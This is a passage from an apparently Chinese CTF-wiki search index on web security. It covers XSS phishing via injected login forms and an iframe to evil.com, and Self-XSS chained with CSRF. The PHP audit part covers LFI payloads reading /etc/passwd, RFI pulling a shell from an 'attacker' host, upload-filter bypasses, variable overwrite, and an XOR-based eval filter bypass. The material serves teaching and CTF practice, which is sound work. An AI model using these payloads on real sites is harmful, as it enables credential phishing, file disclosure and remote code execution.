\u6ce8\u5165\u5f0f\u9493\u9c7c \u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002 http://www.bug.com/index.php?search=\"'<html><head><title>login</title></head><body><div style=\"text-align:center;\"><form Method=\"POST\" Action=\"phishing.php\" Name=\"form\"><br /><br />Login:<br/><input name=\"login\" /><br />Password:<br/><input name=\"Password\" type=\"password\" /><br/><br/><input name=\"Valid\" value=\"Ok\" type=\"submit\" /><br/></form></div></body></html> \u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002 iframe \u9493\u9c7c \u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7 <iframe> \u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002 http://www.bug.com/index.php?search='><iframe src=\"http://www.evil.com\" height=\"100%\" width=\"100%\"</iframe> Flash \u9493\u9c7c \u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528 <object> \u6216 <embed> \u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002 \u9ad8\u7ea7\u9493\u9c7c\u6280\u672f \u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002","title":"\u9493\u9c7c"},{"location":"web/xss/#_3","text":"\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528 <iframe> \u6807\u7b7e\u3002","title":"\u7f51\u9875\u6302\u9a6c"},{"location":"web/xss/#dos-ddos","text":"\u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002","title":"DOS \u4e0e DDOS"},{"location":"web/xss/#xss_5","text":"\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002","title":"XSS \u8815\u866b"},{"location":"web/xss/#self-xss","text":"Self-XSS \u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e00\u4e2a\u5177\u6709 XSS \u6f0f\u6d1e\u7684\u70b9\u53ea\u80fd\u7531\u653b\u51fb\u8005\u672c\u8eab\u89e6\u53d1\uff0c\u5373\u81ea\u5df1\u6253\u81ea\u5df1\u7684\u653b\u51fb\u3002\u6bd4\u5982\u4e2a\u4eba\u9690\u79c1\u7684\u8f93\u5165\u70b9\u5b58\u5728 XSS\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u9690\u79c1\u4fe1\u606f\u53ea\u80fd\u7531\u7528\u6237\u672c\u4eba\u67e5\u770b\u4e5f\u5c31\u65e0\u6cd5\u7528\u4e8e\u653b\u51fb\u5176\u4ed6\u4eba\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u901a\u5e38\u5371\u5bb3\u5f88\u5c0f\uff0c\u663e\u5f97\u6709\u4e9b\u9e21\u808b\u3002\u4f46\u662f\u5728\u4e00\u4e9b\u5177\u4f53\u7684\u573a\u666f\u4e0b\uff0c\u7ed3\u5408\u5176\u4ed6\u6f0f\u6d1e\uff08\u6bd4\u5982 CSRF \uff09\u5c31\u80fd\u5c06 Self-XSS \u8f6c\u53d8\u4e3a\u5177\u6709\u5371\u5bb3\u7684\u6f0f\u6d1e\u3002\u4e0b\u9762\u5c06\u603b\u7ed3\u4e00\u4e9b\u5e38\u89c1\u53ef\u5229\u7528 Self-XSS \u7684\u573a\u666f\u3002 \u767b\u5f55\u767b\u51fa\u5b58\u5728 CSRF\uff0c\u4e2a\u4eba\u4fe1\u606f\u5b58\u5728 Self-XSS\uff0c\u7b2c\u4e09\u65b9\u767b\u5f55 \u8fd9\u79cd\u573a\u666f\u4e00\u822c\u7684\u5229\u7528\u6d41\u7a0b\u662f\u9996\u5148\u653b\u51fb\u8005\u5728\u4e2a\u4eba\u4fe1\u606f XSS \u70b9\u6ce8\u5165 Payload\uff0c\u7136\u540e\u653b\u51fb\u8005\u5236\u9020\u4e00\u4e2a\u6076\u610f\u9875\u9762\u8bf1\u5bfc\u53d7\u5bb3\u8005\u8bbf\u95ee\uff0c\u6076\u610f\u9875\u9762\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u6076\u610f\u9875\u9762\u6267\u884c\u5229\u7528 CSRF \u8ba9\u53d7\u5bb3\u8005\u767b\u5f55\u653b\u51fb\u8005\u7684\u4e2a\u4eba\u4fe1\u606f\u4f4d\u7f6e\uff0c\u89e6\u53d1 XSS payload JavaScript Payload \u751f\u6210 <iframe> \u6807\u7b7e\uff0c\u5e76\u5728\u6846\u67b6\u5185\u6267\u884c\u4ee5\u4e0b\u8fd9\u4e9b\u64cd\u4f5c \u8ba9\u53d7\u5bb3\u8005\u767b\u51fa\u653b\u51fb\u8005\u7684\u8d26\u53f7 \u7136\u540e\u4f7f\u5f97\u53d7\u5bb3\u8005\u901a\u8fc7 CSRF \u767b\u5f55\u5230\u81ea\u5df1\u7684\u8d26\u6237\u4e2a\u4eba\u4fe1\u606f\u754c\u9762 \u653b\u51fb\u8005\u4ece\u9875\u9762\u63d0\u53d6 CSRF Token \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 CSRF Token \u63d0\u4ea4\u4fee\u6539\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f \u8fd9\u79cd\u653b\u51fb\u6d41\u7a0b\u9700\u8981\u6ce8\u610f\u51e0\u4e2a\u5730\u65b9\uff1a\u7b2c\u4e09\u6b65\u767b\u5f55\u662f\u4e0d\u9700\u8981\u7528\u6237\u4ea4\u4e92\u7684\uff0c\u5229\u7528 Google Sign In \u7b49\u975e\u5bc6\u7801\u767b\u5f55\u65b9\u5f0f\u767b\u5f55\uff1b X-Frame-Options \u9700\u8981\u88ab\u8bbe\u7f6e\u4e3a\u540c\u6e90\uff08\u8be5\u9875\u9762\u53ef\u4ee5\u5728\u76f8\u540c\u57df\u540d\u9875\u9762\u7684 iframe \u4e2d\u5c55\u793a \uff09 \u767b\u5f55\u5b58\u5728 CSRF\uff0c\u8d26\u6237\u4fe1\u606f\u5b58\u5728 Self-XSS\uff0cOAUTH \u8ba4\u8bc1 \u8ba9\u7528\u6237\u9000\u51fa\u8d26\u6237\u9875\u9762\uff0c\u4f46\u662f\u4e0d\u9000\u51fa OAUTH \u7684\u6388\u6743\u9875\u9762\uff0c\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7528\u6237\u80fd\u91cd\u65b0\u767b\u5f55\u5176\u8d26\u6237\u9875\u9762 \u8ba9\u7528\u6237\u767b\u5f55\u6211\u4eec\u7684\u8d26\u6237\u9875\u9762\u51fa\u73b0 XSS\uff0c\u5229\u7528 \u4f7f\u7528 <iframe> \u6807\u7b7e\u7b49\u6267\u884c\u6076\u610f\u4ee3\u7801 \u767b\u5f55\u56de\u4ed6\u4eec\u5404\u81ea\u7684\u8d26\u6237\uff0c\u4f46\u662f\u6211\u4eec\u7684 XSS \u5df2\u7ecf\u7a83\u53d6\u5230 Session","title":"Self-XSS \u53d8\u5e9f\u4e3a\u5b9d\u7684\u573a\u666f"},{"location":"web/php/php/","text":"PHP \u4ee3\u7801\u5ba1\u8ba1 \u00b6 \u6587\u4ef6\u5305\u542b \u00b6 \u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile() \u7b49 JSP Servlet\uff1a ava.io.File() \uff0c java.io.FileReader() \u7b49 ASP\uff1a includefile \uff0c includevirtual \u7b49 \u5f53 PHP \u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002 \u672c\u5730\u6587\u4ef6\u5305\u542b \u00b6 \u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002 <?php $file = $_GET [ 'file' ]; if ( file_exists ( '/home/wwwrun/' . $file . '.php' )) { include '/home/wwwrun/' . $file . '.php' ; } ?> \u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6 /etc/passwd \u6587\u4ef6\u5185\u5bb9\u3002 %00 \u622a\u65ad ?file=../../../../../../../../../etc/passwd%00 \u9700\u8981 magic_quotes_gpc=off \uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002 \u8def\u5f84\u957f\u5ea6\u622a\u65ad ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././. Linux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002 \u70b9\u53f7\u622a\u65ad ?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026 \u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b \u00b6 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002 <?php if ( $route == \"share\" ) { require_once $basePath . \"/action/m_share.php\" ; } elseif ( $route == \"sharelink\" ) { require_once $basePath . \"/action/m_sharelink.php\" ; } \u6784\u9020\u53d8\u91cf basePath \u7684\u503c\u3002 /?basePath=http://attacker/phpshell.txt? \u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86 require_once \"http://attacker/phpshell.txt?/action/m_share.php\"; \u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002 \u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b ?file=[http|https|ftp]://example.com/shell.txt \u9700\u8981 allow_url_fopen=On \u5e76\u4e14 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 input ?file=php://input \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 filter ?file=php://filter/convert.base64-encode/resource=index.php \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 data URIs ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 XSS \u6267\u884c ?file=http://127.0.0.1/path/xss.php?xss=phpcode \u9700\u8981 allow_url_fopen=On \uff0c allow_url_include=On \u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002 \u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u88ab WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002 \u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5 \u00b6 \u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d \u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002 Content-Type \u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b \u6293\u5305\u4fee\u6539 Content-Type \u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002 \u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00 \u5c1d\u8bd5 %00 \u622a\u65ad\u3002 \u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b \u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002 Apache \u89e3\u6790 Apache \u5bf9\u540e\u7f00\u89e3\u6790\u662f\u4ece\u53f3\u5411\u5de6\u7684 phpshell.php.rar.rar.rar.rar \u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6 .rar \u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230 .php \uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002 IIS \u89e3\u6790 IIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a abc.asp;xx.jpg \u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a abc.asp \u3002 PHP CGI \u8def\u5f84\u89e3\u6790 \u5f53\u8bbf\u95ee http://www.a.com/path/test.jpg/notexist.php \u65f6\uff0c\u4f1a\u5c06 test.jpg \u5f53\u505a PHP \u89e3\u6790\uff0c notexist.php \u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b location ~ \\.php$ { root html ; fastcgi_pass 127.0.0.1 : 9000 ; fastcgi_index index.php ; fastcgi_param SCRIPT_FILENAME /scripts $fastcgi_script_name ; include fastcgi_param ; } \u5176\u4ed6\u65b9\u5f0f \u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982 php5 \u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002 \u53d8\u91cf\u8986\u76d6 \u00b6 \u5168\u5c40\u53d8\u91cf\u8986\u76d6 \u00b6 \u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u88ab\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002 register_globals = ON \u793a\u4f8b <?php echo \"Register_globals: \" . ( int ) ini_get ( \"register_globals\" ) . \"<br/>\" ; if ( $auth ) { echo \"private!\" ; } ?> \u5f53 register_globals=ON \u65f6\uff0c\u63d0\u4ea4 test.php?auth=1 \uff0c auth \u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002 extract() \u53d8\u91cf\u8986\u76d6 \u00b6 extract() \u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) \u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f EXTR_OVERWRITE \u548c EXTR_SKIP \u3002 \u5f53\u503c\u4e3a EXTR_OVERWRITE \u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a EXTR_SKIP \u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 EXTR_OVERWRITE \u3002 <?php $auth = \"0\" ; extract ( $_GET ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> \u5f53 extract() \u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002 import_request_variables \u53d8\u91cf\u8986\u76d6 \u00b6 bool import_request_variables (string $types [, string $prefix]) import_request_variables \u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002 <?php $auth = \"0\" ; import_request_variables ( \"G\" ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> import_request_variables(\"G\") \u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4 test.php?auth=1 \u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002 parse_str() \u53d8\u91cf\u8986\u76d6 \u00b6 void parse_str ( string $str [, array &$arr ]) parse_str() \u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002 // var.php?var=new \u53d8\u91cf\u8986\u76d6 $var = \"init\"; parse_str($_SERVER[\"QUERY_STRING\"]); print $var; \u4e0e parse_str() \u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 mb_parse_str() \u3002 \u547d\u4ee4\u6267\u884c \u00b6 \u76f4\u63a5\u6267\u884c\u4ee3\u7801 \u00b6 PHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002 eval(); assert(); system(); exec(); shell_exec(); passthru(); escapeshellcmd(); pcntl_exec(); ...... preg_replace() \u4ee3\u7801\u6267\u884c \u00b6 preg_replace() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728 /e \u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002 <?php $var = \"<tag>phpinfo()</tag>\" ; preg_replace ( \"/<tag>(.*?)<\\/tag>/e\" , \"addslashes( \\\\ 1)\" , $var ); ?> \u5982\u679c\u6ca1\u6709 /e \u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002 preg_match \u4ee3\u7801\u6267\u884c \u00b6 preg_match \u6267\u884c\u7684\u662f\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u5339\u914d\u6210\u529f\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002 <?php include 'flag.php'; if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)>40){ die(\"Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); }else{ highlight_file(__FILE__); } //$hint = \"php function getFlag() to get flag\"; ?> \u8fd9\u9053\u9898\u662f xman \u8bad\u7ec3\u8d5b\u7684\u65f6\u5019\uff0c\u6885\u5b50\u9152\u5e08\u5085\u51fa\u7684\u4e00\u9053\u9898\u3002\u8fd9\u4e00\u4e32\u4ee3\u7801\u63cf\u8ff0\u662f\u8fd9\u6837\u5b50\uff0c\u6211\u4eec\u8981\u7ed5\u8fc7 A-Z \u3001 a-z \u3001 0-9 \u8fd9\u4e9b\u5e38\u89c4\u6570\u5b57\u3001\u5b57\u6bcd\u5b57\u7b26\u4e32\u7684\u4f20\u53c2\uff0c\u5c06\u975e\u5b57\u6bcd\u3001\u6570\u5b57\u7684\u5b57\u7b26\u7ecf\u8fc7\u5404\u79cd\u53d8\u6362\uff0c\u6700\u540e\u80fd\u6784\u9020\u51fa a-z \u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e 40 \u3002\u7136\u540e\u518d\u5229\u7528 PHP \u5141\u8bb8\u52a8\u6001\u51fd\u6570\u6267\u884c\u7684\u7279\u70b9\uff0c\u62fc\u63a5\u51fa\u4e00\u4e2a\u51fd\u6570\u540d\uff0c\u8fd9\u91cc\u6211\u4eec\u662f getFlag \uff0c\u7136\u540e\u52a8\u6001\u6267\u884c\u8be5\u4ee3\u7801\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u6211\u4eec\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\u662f\u5982\u4f55\u901a\u8fc7\u5404\u79cd\u53d8\u6362\uff0c\u4f7f\u5f97\u6211\u4eec\u80fd\u591f\u53bb\u6210\u529f\u8bfb\u53d6\u5230 getFlag \u51fd\u6570\uff0c\u7136\u540e\u62ff\u5230 webshell \u3002 \u5728\u7406\u89e3\u8fd9\u4e2a\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5927\u5bb6\u4e86\u89e3\u7684\u662f PHP \u4e2d\u5f02\u6216 ^ \u7684\u6982\u5ff5\u3002 \u6211\u4eec\u5148\u770b\u4e00\u4e0b\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\uff1a <?php echo \"A\"^\"?\"; ?> \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8f93\u51fa\u7684\u7ed3\u679c\u662f\u5b57\u7b26 ~ \u3002\u4e4b\u6240\u4ee5\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u4ee3\u7801\u4e2d\u5bf9\u5b57\u7b26 A \u548c\u5b57\u7b26 ? \u8fdb\u884c\u4e86\u5f02\u6216\u64cd\u4f5c\u3002\u5728 PHP \u4e2d\uff0c\u4e24\u4e2a\u53d8\u91cf\u8fdb\u884c\u5f02\u6216\u65f6\uff0c\u5148\u4f1a\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210 ASCII \u503c\uff0c\u518d\u5c06 ASCII \u503c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u518d\u8fdb\u884c\u5f02\u6216\uff0c\u5f02\u6216\u5b8c\uff0c\u53c8\u5c06\u7ed3\u679c\u4ece\u4e8c\u8fdb\u5236\u8f6c\u6362\u6210\u4e86 ASCII \u503c\uff0c\u518d\u5c06 ASCII \u503c\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u3002\u5f02\u6216\u64cd\u4f5c\u6709\u65f6\u4e5f\u88ab\u7528\u6765\u4ea4\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u3002 \u6bd4\u5982\u50cf\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50 A \u7684 ASCII \u503c\u662f 65 \uff0c\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u503c\u662f 01000001 ? \u7684ASCII\u503c\u662f 63 \uff0c\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u503c\u662f 00111111 \u5f02\u6216\u7684\u4e8c\u8fdb\u5236\u7684\u503c\u662f \u202d01111110\u202c \uff0c\u5bf9\u5e94\u7684 ASCII \u503c\u662f 126 \uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u503c\u5c31\u662f ~ \u4e86 \u6211\u4eec\u90fd\u77e5\u9053\uff0c PHP \u662f\u5f31\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728 PHP \u4e2d\u6211\u4eec\u53ef\u4ee5\u4e0d\u9884\u5148\u58f0\u660e\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u800c\u76f4\u63a5\u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\u5e76\u8fdb\u884c\u521d\u59cb\u5316\u6216\u8d4b\u503c\u64cd\u4f5c\u3002\u6b63\u662f\u7531\u4e8e PHP \u5f31\u7c7b\u578b\u7684\u8fd9\u4e2a\u7279\u70b9\uff0c\u6211\u4eec\u5bf9 PHP \u7684\u53d8\u91cf\u7c7b\u578b\u8fdb\u884c\u9690\u5f0f\u7684\u8f6c\u6362\uff0c\u5e76\u5229\u7528\u8fd9\u4e2a\u7279\u70b9\u8fdb\u884c\u4e00\u4e9b\u975e\u5e38\u89c4\u7684\u64cd\u4f5c\u3002\u5982\u5c06\u6574\u578b\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u578b\uff0c\u5c06\u5e03\u5c14\u578b\u5f53\u4f5c\u6574\u578b\uff0c\u6216\u8005\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u51fd\u6570\u6765\u5904\u7406\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u770b\u4e00\u6bb5\u4ee3\u7801\uff1a <?php function B(){ echo \"Hello Angel_Kitty\"; } $_++; $__= \"?\" ^ \"}\"; $__(); ?> \u4ee3\u7801\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u6211\u4eec\u4e00\u8d77\u6765\u5206\u6790\u4e00\u4e0b\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\uff1a 1\u3001 $_++; \u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\u5bf9\u53d8\u91cf\u540d\u4e3a \"_\" \u7684\u53d8\u91cf\u8fdb\u884c\u81ea\u589e\u64cd\u4f5c\uff0c\u5728 PHP \u4e2d\u672a\u5b9a\u4e49\u7684\u53d8\u91cf\u9ed8\u8ba4\u503c null \uff0c null==false==0 \uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528\u4efb\u4f55\u6570\u5b57\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u5bf9\u672a\u5b9a\u4e49\u53d8\u91cf\u7684\u81ea\u589e\u64cd\u4f5c\u6765\u5f97\u5230\u4e00\u4e2a\u6570\u5b57\u3002 2\u3001 $__=\"?\" ^ \"}\"; \u5bf9\u5b57\u7b26 ? \u548c } \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u5f97\u5230\u7ed3\u679c B \u8d4b\u7ed9\u53d8\u91cf\u540d\u4e3a __ (\u4e24\u4e2a\u4e0b\u5212\u7ebf)\u7684\u53d8\u91cf 3\u3001 $ __ (); \u901a\u8fc7\u4e0a\u9762\u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u53d8\u91cf $__ \u7684\u503c\u4e3a B \uff0c\u6240\u4ee5\u8fd9\u884c\u53ef\u4ee5\u770b\u4f5c\u662f B() \uff0c\u5728 PHP \u4e2d\uff0c\u8fd9\u884c\u4ee3\u7801\u8868\u793a\u8c03\u7528\u51fd\u6570 B 